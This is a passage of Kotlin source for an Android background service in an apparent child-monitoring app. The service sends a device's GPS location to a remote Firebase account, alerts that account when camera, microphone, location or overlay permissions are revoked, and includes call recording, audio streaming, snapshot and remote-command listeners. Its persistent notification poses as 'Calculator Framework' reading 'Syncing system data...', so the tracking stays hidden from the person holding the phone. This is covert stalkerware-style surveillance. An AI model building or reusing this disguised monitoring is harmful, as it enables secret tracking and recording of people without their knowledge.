                                message = "Floating Window / Overlay permission was disabled in Settings on Child Device!",
                                timestamp = System.currentTimeMillis(),
                                severity = "CRITICAL"
                            )
                        )
                    }
                    if (lastLoc && !currLoc) {
                        FirebaseRepository.pushSecurityAlert(
                            uid,
                            com.example.authapp.data.SecurityAlert(
                                type = "PERMISSION_REVOKED",
                                title = "⚠️ Critical: GPS Location Disabled",
                                message = "Location permission was turned off in Settings on Child Device!",
                                timestamp = System.currentTimeMillis(),
                                severity = "CRITICAL"
                            )
                        )
                    }
                    if (lastMic && !currMic) {
                        FirebaseRepository.pushSecurityAlert(
                            uid,
                            com.example.authapp.data.SecurityAlert(
                                type = "PERMISSION_REVOKED",
                                title = "⚠️ Critical: Microphone Disabled",
                                message = "Microphone access was revoked in Settings on Child Device!",
                                timestamp = System.currentTimeMillis(),
                                severity = "CRITICAL"
                            )
                        )
                    }
                    if (lastCam && !currCam) {
                        FirebaseRepository.pushSecurityAlert(
                            uid,
                            com.example.authapp.data.SecurityAlert(
                                type = "PERMISSION_REVOKED",
                                title = "⚠️ Critical: Camera Disabled",
                                message = "Camera permission was revoked in Settings on Child Device!",
                                timestamp = System.currentTimeMillis(),
                                severity = "CRITICAL"
                            )
                        )
                    }

                    lastOverlay = currOverlay
                    lastLoc = currLoc
                    lastMic = currMic
                    lastCam = currCam
                } catch (_: Exception) {}
                permissionShieldHandler?.postDelayed(this, 45000L) // Check every 45 seconds
            }
        }
        permissionShieldHandler?.postDelayed(permissionShieldRunnable!!, 45000L)
    }

    private fun startLocationMonitoring() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location permissions (FINE or COARSE) not granted on child device."
            )
            return
        }
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            locationListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isEmpty()) return
                    val userLoc = UserLocation(
                        latitude = loc.latitude,
                        longitude = loc.longitude,
                        accuracy = loc.accuracy.toDouble(),
                        timestamp = loc.time,
                        provider = loc.provider ?: "gps"
                    )
                    if (isNetworkConnected()) {
                        FirebaseRepository.updateChildLocation(uid, userLoc)
                        if (shouldPersistLocationHistory(loc)) {
                            FirebaseRepository.recordLocationHistoryPoint(uid, userLoc)
                            lastHistoryLocation = Location(loc)
                            lastHistoryTimestamp = System.currentTimeMillis()
                        }
                        com.example.authapp.utils.OfflineLocationCache.flushCachedLocations(applicationContext, uid)
                    } else {
                        com.example.authapp.utils.OfflineLocationCache.cacheLocation(applicationContext, userLoc)
                    }
                    com.example.authapp.utils.GeofenceUtils.checkGeofences(applicationContext, uid, userLoc, activeGeofences)
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }

            // Push last known location only when the corresponding runtime permission is granted.
            val hasFineLocationPermission = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCoarseLocationPermission = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED

            val lastGps = if (hasFineLocationPermission) {
                locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            } else {
                null
            }
            val lastNet = if (hasFineLocationPermission || hasCoarseLocationPermission) {
                locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            } else {
                null
            }
            val bestLast = when {
                lastGps != null && lastNet != null -> if (lastGps.time > lastNet.time) lastGps else lastNet
                lastGps != null -> lastGps
                else -> lastNet
            }
            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            if (bestLast != null && uid.isNotEmpty()) {
                val lastLoc = UserLocation(
                    latitude = bestLast.latitude,
                    longitude = bestLast.longitude,
                    accuracy = bestLast.accuracy.toDouble(),
                    timestamp = bestLast.time,
                    provider = bestLast.provider ?: "last_known"
                )
                if (isNetworkConnected()) {
                    FirebaseRepository.updateChildLocation(uid, lastLoc)
                    com.example.authapp.utils.OfflineLocationCache.flushCachedLocations(applicationContext, uid)
                } else {
                    com.example.authapp.utils.OfflineLocationCache.cacheLocation(applicationContext, lastLoc)
                }
            }

            // Remote-configured updates are clamped to safe minimums to control battery and RTDB cost.
            val locationIntervalMs = RemoteConfigManager.getLocationSyncIntervalSec() * 1000L
            val locationDistanceMeters = RemoteConfigManager.getLocationSyncDistanceMeters()
            if (hasFineLocationPermission) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    locationIntervalMs,
                    locationDistanceMeters,
                    locationListener!!
                )
            }
            if (hasFineLocationPermission || hasCoarseLocationPermission) {
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    locationIntervalMs,
                    locationDistanceMeters,
                    locationListener!!
                )
            }

            // Listen for on-demand "Refresh GPS" from Parent
            if (uid.isNotEmpty()) {
                locationRequestListener = FirebaseRepository.listenToLocationRequests(uid) {
                    fetchSingleLocationFix()
                }
            }
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "SUCCESS",
                "Location listener registered (GPS + Network)"
            )
        } catch (e: SecurityException) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location security exception: ${e.localizedMessage}",
                e.localizedMessage
            )
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "Location init error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun shouldPersistLocationHistory(location: Location): Boolean {
        val now = System.currentTimeMillis()
        val intervalMs = RemoteConfigManager.getLocationHistoryIntervalSec() * 1000L
        val minimumDistance = RemoteConfigManager.getLocationHistoryDistanceMeters()
        val previous = lastHistoryLocation ?: return true
        return now - lastHistoryTimestamp >= intervalMs || previous.distanceTo(location) >= minimumDistance
    }

    private fun fetchSingleLocationFix() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "On-demand location refresh skipped: permission denied"
            )
            return
        }
        try {
            val lm = locationManager ?: (getSystemService(Context.LOCATION_SERVICE) as? LocationManager)
            var locationReceived = false
            val singleListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    if (locationReceived) return
                    locationReceived = true
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isNotEmpty()) {
                        FirebaseRepository.updateChildLocation(
                            uid,
                            UserLocation(
                                latitude = loc.latitude,
                                longitude = loc.longitude,
                                accuracy = loc.accuracy.toDouble(),
                                timestamp = loc.time,
                                provider = loc.provider ?: "gps_refresh"
                            )
                        )
                        AppHealthTelemetry.logDiagnostic(
                            applicationContext,
                            "LOCATION_TRACKING",
                            "SUCCESS",
                            "On-demand single GPS fix acquired (accuracy: ${loc.accuracy}m)"
                        )
                    }
                    try {
                        lm?.removeUpdates(this)
                    } catch (_: Exception) {}
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }
            val hasFineLocationPermission = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCoarseLocationPermission = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED

            if (hasFineLocationPermission) {
                lm?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    0L,
                    0f,
                    singleListener
                )
            }
            if (hasFineLocationPermission || hasCoarseLocationPermission) {
                lm?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    0L,
                    0f,
                    singleListener
                )
            }

            // ✅ CRITICAL FIX: 15-second timeout — agar GPS indoor/off ho toh listener auto-remove ho jaye
            // Prevent stuck GPS listener causing continuous battery drain
            mainHandler.postDelayed({
                if (!locationReceived) {
                    try {
                        lm?.removeUpdates(singleListener)
                        AppHealthTelemetry.logDiagnostic(
                            applicationContext,
                            "LOCATION_TRACKING",
                            "TIMEOUT",
                            "On-demand GPS fix timed out after 15s (indoor or GPS disabled). Listener removed to prevent battery drain."
                        )
                    } catch (_: Exception) {}
                }
            }, 15_000L)
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "fetchSingleLocationFix error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Calculator Framework",
                // ✅ LOW importance: silent status bar notification
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system sync service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(contentText: String): Notification {
        val discreetText = "Syncing system data..."
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Calculator Framework")
            .setContentText(discreetText)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceJob.cancel()
        adaptiveHeartbeatManager?.stop()
        adaptiveHeartbeatManager = null
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        AppHealthTelemetry.syncDeviceHealth(applicationContext, "STOPPED")
        stopStream()
        try {
            callRecorder?.stopCallRecording()
            callRecorder = null
        } catch (_: Exception) {}
        try {
            if (telephonyCallback != null) {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback is android.telephony.TelephonyCallback) {
                    tm?.unregisterTelephonyCallback(telephonyCallback as android.telephony.TelephonyCallback)
                } else if (telephonyCallback is android.telephony.PhoneStateListener) {
                    @Suppress("DEPRECATION")
                    tm?.listen(telephonyCallback as android.telephony.PhoneStateListener, android.telephony.PhoneStateListener.LISTEN_NONE)
                }
                telephonyCallback = null
            }
        } catch (_: Exception) {}
        try {
            streamAudioRecorder?.stopRecording()
            streamAudioRecorder = null
        } catch (_: Exception) {}
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
            audioManager?.isMicrophoneMute = false
        } catch (_: Exception) {}
        val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
        if (uid.isNotEmpty() && streamRequestListener != null) {
            FirebaseRepository.removeStreamRequestListener(uid, streamRequestListener!!)
            streamRequestListener = null
        }
        if (uid.isNotEmpty() && streamRecordingListener != null) {
            FirebaseRepository.removeValueListener("streams/$uid/recordCommand", streamRecordingListener!!)
            streamRecordingListener = null
        }
        if (uid.isNotEmpty()) {
            snapshotRequestListener?.let {
                FirebaseRepository.removeValueListener("streams/$uid/snapshotRequest", it)
            }
            recordingScheduleListener?.let {
                FirebaseRepository.removeValueListener("schedules/$uid", it)
            }
            parentControlsListener?.let {
                FirebaseRepository.removeValueListener("parent_controls/$uid", it)
            }
            remoteCommandsListener?.let {
                FirebaseRepository.removeValueListener("commands/$uid", it)
            }
            geofencesListener?.let {
                FirebaseRepository.removeValueListener("geofences/$uid", it)
            }
        }
        snapshotRequestListener = null
        recordingScheduleListener = null
        parentControlsListener = null
        remoteCommandsListener = null
        geofencesListener = null
        RemoteActionsManager.stopSiren()
        RemoteActionsManager.setTorch(applicationContext, false)
        updateStudyModeOverlay(false, "")
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        if (locationListener != null && locationManager != null) {
            try {
                locationManager?.removeUpdates(locationListener!!)
            } catch (_: Exception) {}
            locationListener = null
        }
        if (locationRequestListener != null) {
            if (uid.isNotEmpty()) {
                FirebaseRepository.removeValueListener("users/$uid/locationRequest", locationRequestListener!!)
            }
            locationRequestListener = null
        }
        releaseWakeLock()
        removeOverlayWindow()
        permissionShieldRunnable?.let { permissionShieldHandler?.removeCallbacks(it) }
        permissionShieldHandler = null
        permissionShieldRunnable = null
        networkCallback?.let {
            try {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
                cm?.unregisterNetworkCallback(it)
            } catch (_: Exception) {}
        }
        networkCallback = null
        networkMonitor?.stopMonitoring()
        batteryReceiver?.let {
            try { unregisterReceiver(it) } catch (e: Exception) {}
        }
        mediaContentObserver?.let {
            try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {}
        }
        mediaContentObserver = null
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && subscriptionsChangedListener is android.telephony.SubscriptionManager.OnSubscriptionsChangedListener) {
                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? android.telephony.SubscriptionManager
                sm?.removeOnSubscriptionsChangedListener(subscriptionsChangedListener as android.telephony.SubscriptionManager.OnSubscriptionsChangedListener)
            }
        } catch (_: Exception) {}
        subscriptionsChangedListener = null
        dynamicSimReceiver?.let {
            try { unregisterReceiver(it) } catch (_: Exception) {}
        }
        dynamicSimReceiver = null
        super.onDestroy()
    }
}
